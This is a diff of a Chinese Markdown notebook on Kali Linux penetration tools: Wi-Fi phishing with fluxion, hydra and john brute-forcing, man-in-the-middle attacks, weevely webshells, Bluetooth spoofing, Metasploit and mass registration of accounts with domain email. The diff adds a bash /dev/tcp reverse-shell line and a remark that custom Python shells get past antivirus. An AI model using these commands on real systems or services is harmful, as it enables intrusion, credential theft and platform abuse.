@@ -2,7 +2,9 @@
 
 ### （1）更新源
 
-`vim /etc/apt/sources.list`**  
+```bash
+vim /etc/apt/sources.list
+```
 
 复制下面源码 选择一个  粘贴到里面，并把原来的源注释掉：
 
@@ -23,10 +25,10 @@
     deb http://mirrors.neusoft.edu.cn/kali> kali-rolling/main non-free contrib
     deb-src http://mirrors.neusoft.edu.cn/kali> kali-rolling/main non-free contrib
 ```bash
-sudo apt-get update #更新软件列表
-sudo apt-get upgrade #更新软件
+# sudo apt-get update #更新软件列表
+# sudo apt-get upgrade #更新软件
 合并为：
-apt-get update && apt-get upgrade
+apt-get update -y&& apt-get upgrade -y
 sudo apt-get dist-upgrade #升级
 sudo apt-get clean #删除缓存包
 sudo apt-get autoclean #删除未安装的deb包
@@ -107,7 +109,6 @@ pip -V
   sudo python2 get-pip.py
   ```
 
-  
 
 
 
@@ -237,6 +238,8 @@ unison 本机文件夹路径 ssh://用户名@ip:端口//虚拟机文件夹路径
 
 # 3. fluxion
 
+---
+
 ## 1）安装
 
 ```bash
@@ -256,9 +259,9 @@ git clone git@github.com:FluxionNetwork/fluxion.git
 
   =>1断开原网络=>3Chinese=>出现6个窗口表示成功
 
-* 
-
 # 4. 生成字典
+
+---
 
 ```bash
 crunch <min> <max> [options]	#min和max是生成的密码的最少、最长位数
@@ -271,6 +274,8 @@ crunch 2 3 012345 -o ./aaa.txt
 ```
 
 # 5. 爆破密码
+
+---
 
 爆破法破解：纯数字密码不超过十位的话还有希望，带标点的基本就不用试了，要是再带字母。
 
@@ -309,6 +314,8 @@ john hash_code.txt
 
 # 6. hydra爆破服务用户名和密码
 
+---
+
 **支持服务：ssh、telnet、ftp、MySQL、RDP(端口3389)**
 
 `hydra 参数 IP 服务名`
@@ -330,6 +337,8 @@ hydra -L /usernameDict.txt -P ./password.txt -t 4 -vV -s 22 127.0.0.1 ssh	##爆�
 ```
 
 # 7. 中间人攻击
+
+---
 
 https://blog.csdn.net/m0_74806866/article/details/134853842
 
@@ -492,6 +501,8 @@ net.sniff on
 
 # 8. BrupSuite
 
+---
+
 安装：
 
 ​			[burp_suite_pro_v2023.10.zip](https://zhuanlan.zhihu.com/p/671358251)
@@ -506,11 +517,15 @@ net.sniff on
 
 # 9.  OWASPBWA--靶机搭建
 
+---
+
 https://blog.csdn.net/qq_53079406/article/details/123862255
 
 
 
 # 10. weevely-文件上传漏洞利用
+
+---
 
 * 生成带密码的php文件
 
@@ -529,6 +544,8 @@ https://blog.csdn.net/qq_53079406/article/details/123862255
 * 输入help可查看更多操作
 
 # 11. 无限邮箱生成
+
+---
 
 使用域名邮箱，在某平台大量注册账号。
 
@@ -594,22 +611,17 @@ https://blog.csdn.net/qq_53079406/article/details/123862255
 
 * 至此，所有形如`XXX@域名`（这里的域名是在CloudFlare申请的域名）的**域名邮箱**收到的邮件，都会被cloudflare的电子邮件路由负责转发到上面填写的**常用邮箱**。
 
----
-
 # 12. 蓝牙攻击
 
+---
+
+> * BLE设备，小功率蓝牙设备
+> * device：可以接受其他设备连接的那种。连上需要配对，所以才需要强连。或者通过克隆，让其他设备连上伪造的克隆。
+
 ```bash
-# c 文件，但我的系统中似乎没有 bluetooth.h 文件
-
-install libbluetooth-dev
+#系统中似乎没有 bluetooth.h 文件
+apt install libbluetooth-dev
 ```
-
-
-
-概念：
-
-* BLE设备，小功率蓝牙设备
-* device：可以接受其他设备连接的那种。连上需要配对，所以才需要强连。或者通过克隆，让其他设备连上伪造的克隆。
 
 ## （0）蓝牙相关命令
 
@@ -648,31 +660,42 @@ install libbluetooth-dev
 
 
 
-## （1）攻击类型
+## （1）攻击类型介绍
 
-* Bluetooth DDos Attach
-
-  在目标设备范围内，向其发送数据包/连接请求，令其无法工作或无法连接设备。
-
-  适用于没有rate limiting或implement sophisticated connection management的设备。
-
-* 蓝牙模拟攻击
-
-  bluetooth impersonation attack
-
-  模拟目标设备的已信任的设备。需要知道已信任设备的信息。
-
-模拟蓝牙键盘，欺骗目标设备以为连接至一个合法设备。可远程控制目标设备，并执行恶意命令。
-
-* 蓝牙拦截攻击
-
-  bluetooth interception attack
-
-* BlueBorne攻击
-
-  不具有广泛适用性，针对操作系统漏洞，因为很多设备在旧版本系统上运行。
+> * Bluetooth DDos Attach
+>
+>   在目标设备范围内，向其发送数据包/连接请求，令其无法工作或无法连接设备。
+>
+>   适用于没有rate limiting或implement sophisticated connection management的设备。
+>
+> * 蓝牙模拟攻击
+>
+>   bluetooth impersonation attack
+>
+>   模拟目标设备的已信任的设备。需要知道已信任设备的信息。
+>
+> 模拟蓝牙键盘，欺骗目标设备以为连接至一个合法设备。可远程控制目标设备，并执行恶意命令。
+>
+> * 蓝牙拦截攻击
+>
+>   bluetooth interception attack
+>
+> * BlueBorne攻击
+>
+>   不具有广泛适用性，针对操作系统漏洞，因为很多设备在旧版本系统上运行。
 
 ## （2）工具
+
+### 0) 修改蓝牙MAC
+
+```bash
+#停止蓝牙设备
+sudo hciconfig hci0 down
+#使用 bdaddr 工具更改蓝牙 MAC 地址。
+sudo bdaddr -i hci0 00:11:22:33:44:55
+```
+
+
 
 ### 1）hcitool——基本扫描，子功能很多
 
@@ -770,6 +793,8 @@ https://www.cnblogs.com/webapplee/p/4060322.html
 
 # 15. MetaSploit（msf)
 
+---
+
 安装：
 
 kali集成在系统内，只能通过apt update -y && apt upgrade -y软件全部更新来更新。
@@ -786,13 +811,19 @@ https://blog.csdn.net/weixin_45588247/article/details/119614618
 
 # 14. 永恒之蓝漏洞
 
+---
+
 win7系统的漏洞。
 
 # 15. VM虚拟机磁盘扩展
 
+---
+
 https://blog.csdn.net/hktkfly6/article/details/123302335
 
 # 16. 设置代理IP
+
+---
 
 [Windows设置代理](https://zhuanlan.zhihu.com/p/486039122#:~:text=%E9%A6%96%E5%85%88%E7%82%B9%E5%87%BB%E6%A1%8C%E9%9D%A2%E5%8F%B3%E4%B8%8B%E8%A7%92%E7%9A%84%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%9B%BE%E6%A0%87%EF%BC%8C%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%EF%BC%9A%20%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%E2%80%9C%E7%BD%91%E7%BB%9C%E5%92%8CInternet%E8%AE%BE%E7%BD%AE%E9%80%89%E9%A1%B9%E2%80%9D%EF%BC%8C%E6%A0%B9%E6%8D%AE%E6%8F%90%E7%A4%BA%E9%80%90%E6%AD%A5%E6%93%8D%E4%BD%9C%EF%BC%8C%E4%B8%8B%E5%9B%BE%E5%B7%B2%E7%BB%8F%E6%A0%87%E6%B3%A8%E5%87%BA%E6%AD%A5%E9%AA%A4%EF%BC%9A%201%E3%80%81%E7%82%B9%E5%87%BB%E4%BB%A3%E7%90%86%3B,2%E3%80%81%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%80%89%E6%8B%A9%E4%B8%BA%E5%BC%80%3B%203%E3%80%81%E8%BE%93%E5%85%A5ip%E5%92%8C%E7%AB%AF%E5%8F%A3%3B%204%E3%80%81%E7%82%B9%E5%87%BB%E4%BF%9D%E5%AD%98%E3%80%82)
 
@@ -887,15 +918,49 @@ ENTER
 
 ---
 
+## （1）原理
+
 也称为反代shell。
 
 被攻击的计算机（被控端）主动连接到攻击者的机器（控制端）获取shell。
 
 **研究下原理和怎么用Python写。**
 
+## （2）Windows下反弹shell的几种方法
+
+https://blog.csdn.net/hackzkaq/article/details/123049915
+
+* nc反弹
+
+  netcat过不了杀软
+
+* 自己编写py程序
+
+  可过杀软
+
+## （3）Linux下反弹shell
+
+### bash命令
+
+```bash
+bash -i >& /dev/tcp/服务器地址/隧道端口 0>&1
+```
+
+![bash命令解释](https://img-blog.csdn.net/20181004004119996?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L256amRzZHM=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)
+
+### msf
+
+https://www.cnblogs.com/wkzb/p/12632091.html
 
 
-# 20. MAC地址隐藏
+
+# 20. Linux提权
+
+---
+
+https://blog.csdn.net/nzjdsds/article/details/82935189
+
+# 21. 网卡MAC地址隐藏
 
 ---
 
@@ -908,8 +973,11 @@ sudo apt-get install macchanger
 ```
 
 ```bash
+airmon-ng stop wlan0	#这句是停用监听模式
+```
+
+```bash
 #停用wlan0端口
-#airmon-ng stop wlan0	#这句是停用监听模式
 ifconfig wlan0 down
 ```
 
